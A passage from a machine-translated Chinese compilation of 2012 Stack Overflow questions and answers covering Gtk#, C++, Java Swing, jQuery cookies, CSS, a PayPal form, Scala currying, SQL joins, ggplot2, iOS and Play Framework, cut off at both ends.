Sender sender = new Sender(defaultApiKey); 
```

# c# - 更改 Gtk.ListStore 的行值

> ID：13548293
> 
> 赞同：1
> 
> 时间：2012-11-25T04:30:07.263
> 
> 标签：c#, gtk#

我通过下一个方法在我的项目中填充树视图：

```
 Gtk.ListStore treeview1ListStore = new Gtk.ListStore (typeof (String), typeof (String));
protected void FillTreeView(TreeView MyTreeView, Gtk.ListStore TreeViewListStore, String[] Column1, String[] Column2)
{
    for(Int32 i=0;i!=Column1.Length;i++)
    {
       TreeViewListStore.AppendValues(Column1[i],Column2[i]);
    }
    MyTreeView.Model=TreeViewListStore
} 
```

我通过以下方式调用此方法：

```
String[] column1 = new String[]{"column1_1","column1_2","column1_3"};
String[] column2 = new String[]{"column2_1","column2_2","column2_3"};
this.FillTreeView(this.treeview1, treeview1ListStore, column1,column2); 
```

现在我想更改一些树视图值，但是当我使用时：

```
 foreach(Gtk.Object currentNode in treeviewListStore)
    {

    } 
```

我的程序崩溃了。如何更改 ListStore 的值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T15:53:53.840

你有没有想过使用 SetValues() 函数？这是一个示例，它将仅用您想要的值填充选定的原始数据。您可以轻松修改此代码，以便使用 TreePath 将值更改为任何特定行：

```
TreeIter iter; TreeModel model;

if( MyTreeView.Selection.GetSelected(out model, out iter))
    TreeViewListStore.SetValues(iter,"column1_1","column1_2","column1_3"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-06T12:57:46.227

这是一个在特定“行”上进行更新的示例 - columnNumber 用作模型中的索引：

```
 public void updateDataOfListStoreInTreeView(ListStore mListstore, int ColumnNumber, params string[] str)
    {
        try {
            bool bUpdated = false;
            TreeIter tmpTreeIter; 

            mListStore.GetIterFirst(out tmpTreeIter);
            object o = mListStore.GetValue(tmpTreeIter, ColumnNumber);
            while(o!=null)
            {
                if(o.ToString()==str[ColumnNumber].ToString()) {
                    mListStore.SetValues(tmpTreeIter,str); // update row
                    bUpdated=true;
                    break;
                }
                if(mListStore.IterNext(ref tmpTreeIter)) {
                    o = mListStore.GetValue(tmpTreeIter, ColumnNumber);
                }
                else 
                    o = null;
            }

            if(!bUpdated)  
                mListStore.AppendValues (str); // Add some data to the store
        }
        catch (Exception e)
        {
            Console.WriteLine("WARNING: adding to treeview caused exception");
        }
    } 
```

# c++ - 分配给变量的值与直接打印的值不同

> ID：13548294
> 
> 赞同：0
> 
> 时间：2012-11-25T04:30:10.017
> 
> 标签：c++

在我的部分代码中，我有

```
a = cache[k1][k2][k3][k4];
cout << "DEBUG: " << a << " " << cache[k1][k2][k3][k4] << endl; 
```

我的 cout 有以下输出：

```
DEBUG: 38 38
DEBUG: 3 3
DEBUG: 37 37
DEBUG: 4 35 <- the problem 
```

我不明白世界上发生了什么。

a,k1,k2,k3,k4 是整数，缓存是

```
vector<vector<vector<vector<int> > > > 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T04:38:02.827

发生这种情况的唯一方法是，如果其中一个索引超出范围，因此您正在访问向量之外的内存。vector 成员函数的`at`工作方式与下标运算符一样，只是它会进行边界检查，并使用它来检测此错误。

```
a = cache.at(k1).at(k2).at(k3).at(k4); 
```

# java - 如何判断在一组按钮中单击了哪个按钮？

> ID：13548299
> 
> 赞同：0
> 
> 时间：2012-11-25T04:30:54.043
> 
> 标签：java, arrays, swing, jbutton, actionlistener

> **可能重复：**
> [如何获取 GridLayout 中元素的 X 和 Y 索引？](https://stackoverflow.com/questions/7702697/how-to-get-x-and-y-index-of-element-inside-gridlayout)

我有一个想要使用的二维按钮数组。当我想调用 actionListener 时，如何判断我的这个二维数组中的哪个按钮索引被单击？这是我第一次与听众打交道，所以如果可以的话，请在更基本的层面上解释这一点。

这是一些关于我如何在网格（12x12）上布置按钮的代码

```
//A loop to add a new button to each section of the board grid.
for (int i = 0; i < gridSize; i++) {
  for (int j = 0; j < gridSize; j++) {
    gameButtons[i][j] = new JButton();
    gameButtons[i][j].setBackground(colors[(int)(Math.random() * numColors)]);
    boardGrid.add(gameButtons[i][j]);

    try {
      UIManager.setLookAndFeel(UIManager.getCrossPlatformLookAndFeelClassName());
    }
    catch (Exception e) {
    }

  }
} 
```

这些按钮从之前创建的颜色数组中随机分配一种颜色。我现在必须覆盖 actionlistener，但我不知道如何以一种允许我按下按钮并将其与周围的其他按钮进行比较的方式来做到这一点。我想提一下，我正在处理静态方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T04:38:22.190

首先，您应该通过此方法将所有按钮注册到 actionlistener `addActionListener()`。然后在该`actionPerformed()`方法中，您应该调用`getSource()`以获取对单击的按钮的引用。

检查这个[帖子](http://www.coderanch.com/t/376375/java/java/array-Jbutton-event-getSource)

无论如何这里是代码， gameButtons[][] 数组必须在全球范围内可用

```
//A loop to add a new button to each section of the board grid.
for (int i = 0; i < gridSize; i++) 
{
  for (int j = 0; j < gridSize; j++) 
  {
    gameButtons[i][j] = new JButton();
    gameButtons[i][j].addActionListener(this);
    gameButtons[i][j].setBackground(colors[(int)(Math.random() * numColors)]);
    boardGrid.add(gameButtons[i][j]);

    try {
    UIManager.setLookAndFeel(UIManager.getCrossPlatformLookAndFeelClassName());
    } catch (Exception e) { } 
  }
}

//--------------------------------------------------------

@Override
public void actionPerformed(ActionEvent ae)
{
  for (int i = 0; i < gridSize; i++) 
  {
    for (int j = 0; j < gridSize; j++) 
     {
       if(ae.getSource()==gameButtons[i][j]) //gameButtons[i][j] was clicked
       {
             //Your code here
       }
     }
  }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-25T07:01:48.710

如果您想避免再次循环遍历数组，您也可以将索引存储在中`JButton`。

```
JButton button = new JButton();
button.putClientProperty( "firstIndex", new Integer( i ) );
button.putClientProperty( "secondIndex", new Integer( j ) ); 
```

然后在你的`ActionListener`

```
JButton button = (JButton) actionEvent.getSource();
Integer firstIndex = button.getClientProperty( "firstIndex" );
Integer secondIndex = button.getClientProperty( "secondIndex" ); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-25T04:38:26.663

如果您需要按下按钮的**索引，请尝试以下操作：**

```
private Point getPressedButton(ActionEvent evt){
    Object source = evt.getSource();
    for(int i = 0; i < buttons.length; i++){
        for(int j = 0; j < buttons[i].length; j++){
            if(buttons[i][j] == source)
                return new Point(i,j);
        }
    }
    return null;
} 
```

然后你可以通过

```
Point p = getPressedButton(evt); 
```

这意味着：

> > > 按下按钮 == 按钮[px][py]

否则，一个简单的调用`evt.getSource();`就可以完成这项工作。

# java - 实施不起作用

> ID：13548300
> 
> 赞同：2
> 
> 时间：2012-11-25T04:31:01.850
> 
> 标签：java, inheritance, implementation, parent-child

我有4节课。一个是驱动类，一个是接口类和两个子类。这是接口类：

```
public interface Speaker {
    public void speak();
    public void announce(String announcement);
} 
```

这是驱动程序类：

```
public abstract class SpeakerDriver implements Speaker {
    public static void main (String [] args) {
        Speaker ref;
        Politician poli = new Politician("George Bush");
        Lecturer lect = new Lecturer("Professor Cross");
        Pastor past = new Pastor ("P.M. Smith");

        ref = poli;
        ref = lect;
        ref = past;

        System.out.println();
        System.out.println(lect);
        System.out.println(past);   
    }
} 
```

这些是两个子类：

```
public class Pastor implements Speaker {
    protected String announcement;

    public Pastor (String name) {       
    }

    @Override
    public void speak() {   
    }

    @Override
    public void announce(String announc) {
        System.out.println("I am the pastor at CCBC."); 
    }
}

public class Lecturer implements Speaker {
    protected String announcement;

    public Lecturer(String name) {
    }

    @Override
    public void speak() {
    }

    @Override
    public void announce(String announcement) {     
        System.out.println("I am the lecturer at CCBC");    
    }
} 
```

我的问题是，我的实现有什么问题使输出看起来像这样：

```
讲师@a90653
牧师@de6ced

```

当它们应该包含 println 中的文本时。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-25T04:34:21.930

您正在使用以下语句打印对象：

```
System.out.println(lect); 
```

您可能打算在对象上调用一个函数：

```
lect.announce(); 
```

另请注意，您的驱动程序类实际上不需要实现“扬声器”接口，以下语句中的前两个实际上什么也没做：

```
ref = poli;
ref = lect;
ref = past; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-25T04:34:15.580

您只需要在每个子类中实现一个 toString() 方法。

```
public String toString() {
    return this.name;
} 
```

类似的东西。print() 调用此方法返回一个字符串。

编辑：忽略，没有阅读结束位。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T04:36:22.370

要解决此问题，您需要覆盖每个类中的 toString() 方法，此输出是对象的地址和类型，因为 Java 不知道如何将其转换为字符串。似乎您可能打算调用 {object}.announce() 而不是尝试打印对象。

# javascript - 记住语言选择 - 然后在后续访问中重定向到主页

> ID：13548301
> 
> 赞同：0
> 
> 时间：2012-11-25T04:31:16.513
> 
> 标签：javascript, jquery, cookies, selection

我有一个 html 页面，index.html 用于语言选择（带有 2 个语言链接的简单黑色覆盖），它充当用户总是访问的页面，除非在地址中添加 /EN 或 /CN，然后每个链接都链接到不同的 html文件，EN.html 和 CN.html。有谁知道如何创建 cookie 以便某人第一次访问我的网站时，他/她会正常进入语言选择 index.html，选择语言，创建 cookie 以记住选择，然后在以后的访问中完全跳过 index.html 并直接访问 www.mywebsite.com/EN 或 www.mywebsite.com/CN，即使她/他输入“www.mywebsite.com”？我在这个网站上阅读了一个关于创建一个记住语言选择的 cookie 的教程，它基本上归结为 JQuery cookie 插件和一个像这样的脚本：

```
$(function () {

var url = 'your_url';
var en_page = 'en.html';
var cn_page = 'cn.html';

if ($.cookie('default_page') != null) {
    if (window.location.href != url + '/' + $.cookie('default_page')) {
        window.location.href = url + '/' + $.cookie('default_page');
    }
}

$('#set_en_button').click(function () {
    $.cookie('default_page', en_page, { expires: 999 });
});

$('#set_cn_button').click(function () {
    $.cookie('default_page', cn_page, { expires: 999 });
});

}); 
```

但我认为这只适用于语言选择页面与其中一种语言相同的 html 文件？什么语言选择页面是单独的页面？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T23:06:34.500

你可以通过两种方式解决这个问题。更可靠但更复杂的方法是在您单击链接导航回主页时清除 cookie。例子：

```
<a href="index.html" class="return-link">Back Home</a>
<script type="text/javascript">
$(function() {
    $('.return-link').click(function(e) {
        $.removeCookie('default_page');
    });
});
</script> 
```

此解决方案并不理想，因为：

*   当您在整个网站中添加更多链接回到您的主页时，很难维护

更优雅的解决方案是更改您的主页代码并使用该`document.referrer`属性。该属性保存在到达当前页面之前访问的最后一个页面。使用这些知识，您可以将代码更改为：

```
$(function () {

var url = 'your_url';
var en_page = 'en.html';
var cn_page = 'cn.html';

// if the last page you visited has the same hostname
// as the index page, (eg. www.domain.com == www.domain.com)
// you must be coming from a page on your own site
// therefore clear the existing cookie
if (document.referrer.host == document.location.host) {
    $.removeCookie('default_page');
}

if ($.cookie('default_page') != null) {
    if (window.location.href != url + '/' + $.cookie('default_page')) {
        window.location.href = url + '/' + $.cookie('default_page');
    }
}

$('#set_en_button').click(function () {
    $.cookie('default_page', en_page, { expires: 999 });
});

$('#set_cn_button').click(function () {
    $.cookie('default_page', cn_page, { expires: 999 });
});

}); 
```

该解决方案更具可扩展性，因为：

*   您不必修改任何其他文件

注意：在特殊情况下，referrer 字段有时可能为空。您将不得不研究它的可靠性，但我认为在这种情况下，它应该几乎一直有效。

# html - 相对于元素但在右侧 css 居中文本

> ID：13548303
> 
> 赞同：0
> 
> 时间：2012-11-25T04:31:54.717
> 
> 标签：html, css

假设我有一个跨度，其背景包含图像和 div 中的一些文本，例如：

```
<div id="myDiv">
    <span style="background: url('path_to_background_image');">My Span</span>
    <span>Some text...</span>
</div> 
```

我希望文本`Some text...`始终显示在左侧跨度（以图像为背景的跨度）的右中位置。文本是动态的，所以我希望文本始终保持在左侧跨度的右侧（居中在右侧），无论文本增大或缩小。完全没有 JQuery（只是普通的 HTML 和 CSS）有可能实现这样的事情吗？

请告诉我。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:29:16.270

我认为你最好只使用 div，特别是如果你总是希望文本出现在某个位置。例如，如果您希望它们两个一起位于中心并且只希望它占据指定的大小，请执行以下操作：

```
 <style>
    #wrapper{margin-left: auto: margin-right: auto: width: 700px;}
    #title{float: left; width: 20%};
    #text{float: left; width: 80%};
  </style>

  <div id="wrapper">
    <div id="title">Title</div>
    <div id="text'>...Random amount of Text</div>
  </div> 
```

你可以玩弄边距等以使其完美。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:59:22.520

我同意 Verber 使用 div，不过，我刚刚通过以下代码实现了您正在寻找的效果：

```
<style>
.with-background {
position:relative;
height:250px;
width:600px;
background:url(bg-image.jpg);
}

.caption {
position:relative;
left:350;
background:pink;
top:50;
width:200px;
height:100px;
}
</style> 
```

..对于标记：

```
<div class="with-background">
    <div class="caption">
        <p>Some Text</p>
    </div>
</div> 
```

这段代码将一个正方形的文本设置在中心的右侧（使用 left:350），距离上边框 50 像素（使用 top:50）。由于背景图像是 600 像素宽，我将“caption”类的“left”属性设置为 350，只是背景图像宽度的一半多一点。根据您自己的背景图像的大小进行修改，您应该很好。

“背景：粉红色；” 属性就是这样我可以很容易地看到 div 的位置 :)

# paypal - Paypal 金额计算和折扣 :(

> ID：13548307
> 
> 赞同：0
> 
> 时间：2012-11-25T04:32:13.923
> 
> 标签：paypal, paypal-adaptive-payments

我正在尝试创建一个贝宝表单，它将 2 个金额框加在一起，如果在特定日期购买，总金额减去 5 美元。几天来我一直在尝试这样做，但一无所获。以下是我拥有的代码；感谢所有帮助:)

```
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_xclick">
<input type="hidden" name="business" value="ZNRGUCQ5GN4HU">
<input type="hidden" name="lc" value="US">
<input type="hidden" name="item_name" value="Gaslight Registration">
<input type="hidden" name="amount" value="40.00">
<input type="hidden" name="currency_code" value="USD">
<input type="hidden" name="button_subtype" value="services">
<input type="hidden" name="no_note" value="0">
<input type="hidden" name="cn" value="Is your Angel donation assigned? to who?">
<input type="hidden" name="no_shipping" value="1">
<input type="hidden" name="rm" value="1">
<input type="hidden" name="return" value="http://gaslight.endogaming.net">
<input type="hidden" name="cancel_return" value="http://gaslight.endogaming.net">
<input type="hidden" name="bn" value="PP-BuyNowBF:btn_paynow_LG.gif:NonHosted">
<table>
<tr><td><input type="hidden" name="on0" value="Character Name">Character Name</td></tr><tr><td><input type="text" name="on0" maxlength="200"></td></tr>
<tr><td>Angel Donation</td></tr><tr><td><input type="text" name="amount" maxlength="60"></td></tr>
</table>
<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_paynow_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T00:46:36.783

你没有给出你想要达到的计算代码。所有这一切，您必须使用 PHP 等服务器端语言或您正在使用的其他语言进行计算，然后将结果变量存储到 HTML 表单中的数量输入中。计算部分不能是 Paypal HTML 表单的一部分，因此请在 Paypal HTML 表单之外进行计算。

# scala - 为什么在这个 Scala 方法定义中有两组参数/括号？

> ID：13548308
> 
> 赞同：46
> 
> 时间：2012-11-25T04:32:30.630
> 
> 标签：scala, syntax

我是 Scala 的新手，正在阅读一些关于 ScalaSTM 的资料。

如果有人可以简单地命名下面的概念，我将不胜感激，其中有两组括号被传递给该方法。：

```
def transfer(amount: Int, a: Ref[Int], b: Ref[Int])(c: Transaction) {
  a.:=(a.get(c) - amount)(c)
  b.:=(b.get(c) + amount)(c)
} 
```

内部采用什么概念`c: Transaction`？

一旦我知道我在寻找什么，我会进一步阅读！

谢谢

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2017-01-25T11:43:06.847

这被命名为`Currying`。柯里化函数的类型为 A => B => C。

该函数`def foo(a: A, b: B): C`具有类型`(A, B) => C`。另一方面，该函数`def curriedFoo(a: A)(b: B): C`具有类型`A => B => C`。使用 curried 函数，您可以执行`def curriedFooWithA = curriedFoo(a)`类型为`B => C`. 您不必一次性提供所有论点。

因此，在您的情况下，您可以提供`amount`,`a`和`b`. 您将获得一个采用`Transaction`. 另一种情况是 type 的函数`Request => DataBase => Int`，您只需提供`Request`，最后当您确实需要运行请求时，提供`DataBase`请求必须发送到的 。

类型`(A, B) => C`和`A => B => C`是同构的。Scala 提供了`tupled`and `uncurried`that 就是这样做的。

`def curriedFoo(a: A)(b: B): C = a => b => foo(a, b)`

`def foo(a: A, b: B): C => (a, b) => curriedFoo(a, b)`

# javascript - 在另一个脚本之前完全加载脚本的正确方法是什么

> ID：13548312
> 
> 赞同：1
> 
> 时间：2012-11-25T04:33:49.447
> 
> 标签：javascript, jquery, html

我正在制作一个由几个部分划分的网站

```
<div id='section-1' class='section'>web content</div>
<div id='section-2' class='section'>web content</div> 
```

我的网页上有十个部分，当文档通过 javascript 准备好时，每个部分的高度都设置为用户窗口高度

```
$('.section').height($(window).height()); 
```

我网页上的某些效果（例如幻灯片）需要计算出该部分的高度才能正常工作。因此，我总是在准备好文档时使用类似的东西作为解决方案。

```
setTimeout(startslideshow,1000);
setTimeout(startanimations,1000); ...etc 
```

确保部分高度是幻灯片代码开始之前的用户窗口高度，因为一旦加载网页后，部分无法立即更改为用户窗口高度，这将在我的幻灯片代码中产生严重问题，例如错误的计算位置。

因此会出现这样一种情况，页面加载后，大约有一秒钟的时间一切都搞砸了，在一切正常之前，我怎么能避免被用户看到呢？我试着`$(document).hide()`，或者`$('html,body').hide()`，然后在一秒钟后淡入，但我遇到了其他奇怪的问题，尤其是在 ipad 上，我的固定位置顶部导航栏在用户滚动时总是会变成“不固定”。

由于我是自学者，恐怕我的方法不典型。我想知道真正的 web 程序员在必须将他的网页分成不同的部分并将其高度设置为窗口高度时通常会做什么，然后确保依赖于部分高度的其他效果正常工作并避免等一下高度变化？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:51:54.220

您应该查看[链接异步调用。](http://lennybacon.com/post/2011/10/03/chainingasynchronousjavascriptcalls)

不建议依赖计时器，因为脚本可能在不同的浏览器、硬件等上以不同的速度执行。

# javascript - 未捕获的类型错误：对象 [object Object] 没有方法“val”

> ID：13548318
> 
> 赞同：0
> 
> 时间：2012-11-25T04:34:52.840
> 
> 标签：javascript, jquery, validation

我正在尝试实现 jQuery 验证。场景是如果一个字段为空，它将给出一个必需的消息错误。如果不为空并且输入无效，它将为每个字段提供特定的错误消息。使用我当前的代码，我收到此错误：

> 未捕获的类型错误：对象 [object Object] 没有方法“val”

解决这个问题的任何提示？这是小提琴：http: [//jsfiddle.net/PDjwZ/4/](http://jsfiddle.net/PDjwZ/4/)

```
if (!/^[a-zA-Z]+$/.test(name.val()) && name.val() != emptyerror) {
    name.addClass("needsfilled");
    name.val(nameerror);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:37:16.997

编辑（查看小提琴后）：

`var`声明变量时似乎没有使用。我已经编辑了小提琴以更改`name = $("#name")`为`var name = $("#name")`. 似乎变量名与其他一些（全局）变量冲突。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T04:42:34.680

您需要正确声明变量；他们将进入全局命名空间。看到[这个更新的小提琴](http://jsfiddle.net/PDjwZ/8/)。

例如

```
var name = $("#name"); 
```

# sql - 使用不同邮政编码从同一销售区域获取销售人员

> ID：13548319
> 
> 赞同：2
> 
> 时间：2012-11-25T04:34:57.933
> 
> 标签：sql, sql-server-2008

我正在尝试显示与`William`. 在我的`customer`表格中，我将邮政编码作为`zipCode`列。在我的`city`表中，我的城市名称为`cityName`.

**表城市**：

```
zipCode (PK) cityName, stateCode 
```

**表客户**：

```
customerId (PK) customerName, customerAddress, zipCode (FK) 
```

到目前为止我的查询...

```
SELECT 
    cu2.customerName AS 'Customer Name', 
    ci2.cityName AS 'City Name'
FROM 
    customer as cu
INNER JOIN 
    city as ci ON cu.zipCode = ci.zipCode
INNER JOIN 
    city as ci2 ON ci.cityName = ci2.cityName
INNER JOIN 
    customer as cu2 ON ci2.zipCode = cu2.zipCode
                    AND cu2.customerName <> cu.customerName
WHERE 
    cu2.customerName = 'William' 
```

它没有显示任何结果，因为我认为当他所在的城市有另外两个邮政编码时，它只会检查威廉的邮政编码。他的号码是 91709，cityNAME 还有 91708 和 91710。我需要找到该 cityNAME 内的其他客户。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:49:30.517

我会将您的架构视为：

> 客户（客户 ID、客户名称、城市 ID、...）
> 
> 城市 (cityid, cityName, zip, ...)

要检索与“威廉”居住在同一城市的客户，您需要

```
SELECT cust.customerName, cit.city_name
FROM customer cust
JOIN city cit ON cust.cityid = cit.cityid
WHERE cit.cityid IN (
     SELECT cit2.cityid
     FROM city cit2
     JOIN customer cust2 ON cit2.cityid = cust2.cityid
     WHERE cust2.customerName = 'William'
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T10:55:26.360

```
SELECT ct.customerName
FROM city c JOIN customer ct ON c.ZipCode = ct.ZipCode
WHERE c.CityName IN (
                     SELECT c.CityName
                     FROM customer ct JOIN city c ON ct.ZipCode = c.ZipCode 
                     WHERE ct.CustomerName = 'William'
                     ) 
```

# r - geom_point 中大小的真正含义是什么？

> ID：13548321
> 
> 赞同：12
> 
> 时间：2012-11-25T04:35:40.007
> 
> 标签：r, ggplot2

在这两个图中，点看起来不同，但为什么呢？

```
mya <- data.frame(a=1:100)

ggplot() +
  geom_path(data=mya, aes(x=a, y=a, colour=2, size=seq(0.1,10,0.1))) +
  geom_point(data=mya, aes(x=a, y=a, colour=1, size=1)) +
  theme_bw() +
  theme(text=element_text(size=11))

ggplot() +
  geom_path(data=mya, aes(x=a, y=a, colour=2, size=1)) +
  geom_point(data=mya, aes(x=a, y=a, colour=1, size=1)) +
  theme_bw() +
  theme(text=element_text(size=11)) 
```

`?aes_linetype_size_shape`解释...

```
 # Size examples
 # Should be specified with a numerical value (in millimetres),
 # or from a variable source 
```

但在我的代码中，它看起来不同。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-25T23:34:00.320

您的代码中发生了一些令人困惑的事情。您似乎以`aes`非预期的方式使用该功能。除了这个`size`问题，你还有多个传说，我认为 ggplot 对颜色感到困惑。

该`aes`函数用于将美学映射到数据中的变量，但您正在使用它将美学设置为常数。此外，您正在使用该`aes`功能设置两个单独的美学。即使您设置`size`为常数，ggplot2 也不喜欢两个单独的（路径和点）大小映射。此外，您对颜色映射执行相同的操作。

`size`并`colour`设置为常数值，因此将它们移到`aes`函数之外。此外，关于第一个图中的路径，将变量添加到数据框中`size`可能更安全。`size`（我已经稍微修改了您的数据，以便点和路径都可见。）正如预期的那样，在第一个图中绘制了一个图例。

```
 library(ggplot2)
mya <- data.frame(a=1:10, size = seq(10, 1, -1))

ggplot() +
  geom_path(data=mya, aes(x=a, y=a, size=size), colour = 2) +
  geom_point(data=mya, aes(x=a, y=a), colour = 1, size = 3) +
  theme_bw() +
  theme(text=element_text(size=11))

ggplot() +
  geom_path(data=mya, aes(x=a, y=a), colour = 2, size = 1) +
  geom_point(data=mya, aes(x=a, y=a), colour = 1, size = 3) +
  theme_bw() +
  theme(text=element_text(size=11)) 
```

![在此处输入图像描述](../Images/4d5a43d8d0d4d8a38048e1eb6b9383cf.png)

# ios - iOS 应用程序在更新时崩溃，但在加载新应用程序时不会崩溃

> ID：13548327
> 
> 赞同：0
> 
> 时间：2012-11-25T04:36:38.423
> 
> 标签：ios

我正在向我现有的应用程序添加一个应用程序内购买选项，当我在模拟器上测试它时，它工作正常。当我通过 Xcode 在我的 iOS 设备上测试它时，当我到达应用内购买代码时它会崩溃。

奇怪的是，如果我从设备中删除现有应用程序然后对其进行测试，它可以完美运行。这让我认为代码没有任何问题，但我对它可能是什么感到困惑。

有没有其他人遇到过类似的事情？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-01T00:03:15.943

数据模型中的某些内容发生了变化。当您更新应用程序而不是安装新应用程序时，核心数据或数据库不会被替换，因此您正在使用旧数据模型的新代码。删除并重新安装是正确的解决方案，尽管有些人不明白原因。

# c++ - C++11：使用容器参数定义函数（如基于范围的 for）？

> ID：13548339
> 
> 赞同：14
> 
> 时间：2012-11-25T04:38:59.733
> 
> 标签：c++, c++11

在 C++11 中，我经常需要定义一个将容器作为参数的函数。

例如，让我们定义一个函数`addup`（是的，只是一个简单的版本`std::accumulate`）：

```
template <class I>
int addup (I first, I last)
{
    int x = 0;
    while ( first != last )
        x += *first++;
    return x;
} 
```

这需要一个迭代器范围，它是灵活的并且是标准库的习惯用法。

但是假设我有一个功能：

```
vector<T> f(); 
```

我必须这样做：

```
auto v = f();
int x = addup(v.begin(), v.end()); 
```

我宁愿这样做：

```
int x = addup(f()); 
```

就像我可以这样做：

```
for (auto t : f())
    ... 
```

本着基于*范围*的精神，我想要这样的东西：

```
template<class C>
int addup(C&& container)
{
    addup(beginexpr(container), endexpr(container)); // ???
} 
```

在标准中，它在 6.5.4（释义）中说：

> (A) if`container`是一个数组类型，`beginexpr`并且`endexpr`分别是 are`container`和`container`+ `bound`，`bound`数组绑定在哪里。
> 
> (B) 如果`container`是类类型，则在类的范围内查找 unqualified-ids`begin`和就像通过类成员访问查找 (3.4.5) 一样，并且如果其中一个（或两者）找到至少一个声明，并且是container.begin() 和 container.end() 分别；`end``container``beginexpr``endexpr`
> 
> (C) 否则，`beginexpr`分别`endexpr`是`begin(container)`和`end(container)`，其中 begin 和 end 使用参数相关查找 (3.4.2) 进行查找。

是否可以定义一组重载或特化`addup`来处理这四种情况，而不与其他重载冲突？那首先是一个常规的迭代器对函数，然后是上面的 A、B 和 C 中的每一个。如何？

（如果这是可能的，那么为什么标准库不提供这样的重载？）

另外，如果函数在容器之外接受额外的参数怎么办？我们是否可以修改重载，使添加到所有重载的*可选额外参数* `x`（具有默认值的参数）不会使以下两个调用产生歧义：

```
addup(v.begin(), v.end());
addup(v, x); 
```

那就是我们可以静态断言（使用“SFINAE”或类似的）模板参数必须是一个迭代器、一个数组、一个容器类等 - 并将这些信息用于重载消歧？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-25T04:57:01.183

这就是我要做的：

```
template<class Range>
int addup(Range&& range)
{
    using std::begin;
    using std::end;
    addup(begin(range), end(range));  // begin(), NOT std::begin()  (ADL)
} 
```

它将处理所有重要案例并正确执行 ADL。我不确定它是否等同于 ranged-based-for 所做的，但我认为这是最好的解决方案。

> 以下两个电话不明确：

我还没有编译，但除非`x`需要隐式转换，否则我看不到任何歧义。您还可以使用`boost::make_iterator_range`并避免迭代器参数重载。

* * *

我认为这也将起作用：

```
template<class Range>
int addup(Range&& range)
{
    int x = 0;
    for(auto&& v : range)
        x += v;
    return x; 
}

template <class I>
int addup (I first, I last)
{
    return addup(boost::make_iterator_range(first, last));
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-25T05:23:48.667

几个案例：

*   如果您没有任何其他参数，则可以使用`std::begin`和处理所有情况`std::end`
*   还有一个附加参数，其类型不是模板或取决于您的范围/迭代器（例如，`T::value_type`将在范围和迭代器上工作）或具有默认值。然后又没有问题了。
*   还有一个与范围无关的附加参数，其类型是模板并且没有默认值。然后，如果在调用函数时不手动指定该类型，则无法执行此操作。

这是一个例子：

```
template <class Thing, class Iterator>
void DoStuff(Iterator first, Iterator last, Thing thing = Thing())
{ ... }

template <class Thing, class Range>
void DoStuff(Range& range, Thing thing = Thing())
{ ... }

vector<int> coin = {1,2,3,4};
DoStuff(coin, 123); // OK
DoStuff(begin(coin), end(coin), 123); // OK
DoStuff<int>(coin); // OK
DoStuff<int>(begin(coin), end(coin)); // OK

DoStuff(coin); // !! KO
DoStuff(begin(coin), end(coin)); // !! KO 
```

如果您用 or 替换`Thing`（`typename Range::value_type`并将`int`其移动到模板参数列表中的第二个位置），那么所有重载都将起作用。你也可以给`Thing`一个默认值。

# playframework - 玩法框架2：多对多保存

> ID：13548342
> 
> 赞同：3
> 
> 时间：2012-11-25T04:39:22.110
> 
> 标签：playframework, many-to-many

我是 Play Framework 2 的新手。我有 2 个模型：书籍和作者，一本书可以有很多作者，所以我认为它是多对多的。这是我的模型：

```
@Entity 
public class Book extends Model {

  @Id
  public Long id;

  @Constraints.Required
  public String title;

  @Constraints.Required    
  @ManyToMany(cascade=CascadeType.ALL,mappedBy="books") 
  public Set<Author> authors = new HashSet<Author>(); 
  public static Model.Finder<Long,Book> find = new Model.Finder<Long,Book>(Long.class, Book.class);

  public static Page<Book> page(int page, int pageSize, String sortBy, String order, String filter) {
      return 
        find.where()
            .ilike("title", "%" + filter + "%")                
            .orderBy(sortBy + " " + order)     
            .findPagingList(pageSize)
            .getPage(page);
  }

}

@Entity 
public class Author extends Model {

  @Id
  public Long id;

  @Constraints.Required
  public String name;

  @ManyToMany(cascade=CascadeType.ALL) 
  public Set<Book> books = new HashSet<Book>(); 

  public static Model.Finder<Long,Author> find = new Model.Finder<Long,Author>(Long.class, Author.class);

  public static Page<Author> page(int page, int pageSize, String sortBy, String order, String filter) {
      return 
        find.where()
            .ilike("name", "%" + filter + "%")
            .orderBy(sortBy + " " + order)                
            .findPagingList(pageSize)
            .getPage(page);
  }

} 
```

我在输入表单中使用这个选择标签，如下所示：

```
<select name="authors.id" multiple="multiple">
  <option value="1">bejo</option>
  <option value="2">joko</option>
</select> 
```

这是我的控制器代码：

```
Map<String, String> newData = new HashMap<String, String>();
Map<String, String[]> urlFormEncoded = play.mvc.Controller.request().body().asFormUrlEncoded();
if (urlFormEncoded != null) {
  for (String key : urlFormEncoded.keySet()) {
